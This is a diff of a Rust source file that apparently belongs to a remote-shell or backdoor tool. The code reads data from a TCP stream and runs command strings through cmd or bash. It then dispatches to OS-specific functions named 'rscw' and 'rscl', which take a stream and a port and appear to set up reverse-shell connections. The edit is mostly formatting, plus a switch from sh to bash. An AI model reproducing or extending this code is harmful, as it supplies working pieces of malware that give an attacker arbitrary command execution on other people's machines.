@@ -3,7 +3,6 @@ use std::net::TcpStream;
 use std::process::{Command, ExitStatus};
 use std::str::from_utf8;
 
-
 pub fn reader(stream: &TcpStream) -> Result<String, Error> {
     let mut msg: BufReader<&TcpStream> = BufReader::new(&stream);
     let mut buffer: Vec<u8> = Vec::new();
@@ -23,11 +22,8 @@ pub fn reader(stream: &TcpStream) -> Result<String, Error> {
 fn run_command(command: String) -> Result<ExitStatus, Error> {
     if cfg!(target_os = "windows") {
         return Command::new("cmd").arg("/C").arg(command).status();
-    }else if cfg!(target_os = "linux") {
-        return Command::new("sh")
-        .arg("-c")
-        .arg(command)
-        .status();
+    } else if cfg!(target_os = "linux") {
+        return Command::new("bash").arg("-c").arg(command).status();
     }
     Err(Error::new(ErrorKind::Unsupported, "No supported OS"))
 }
@@ -57,10 +53,9 @@ fn rscw(stream: &TcpStream, port: u16) -> Result<ExitStatus, Error> {
 pub fn rsc(stream: &TcpStream, port: u16) -> Result<ExitStatus, Error> {
     if cfg!(target_os = "windows") {
         rscw(&stream, port)
-    }else if cfg!(target_os = "linux") {
+    } else if cfg!(target_os = "linux") {
         rscl(&stream, port)
-    }else{
+    } else {
         Err(Error::new(ErrorKind::Unsupported, "No supported OS"))
     }
 }
-
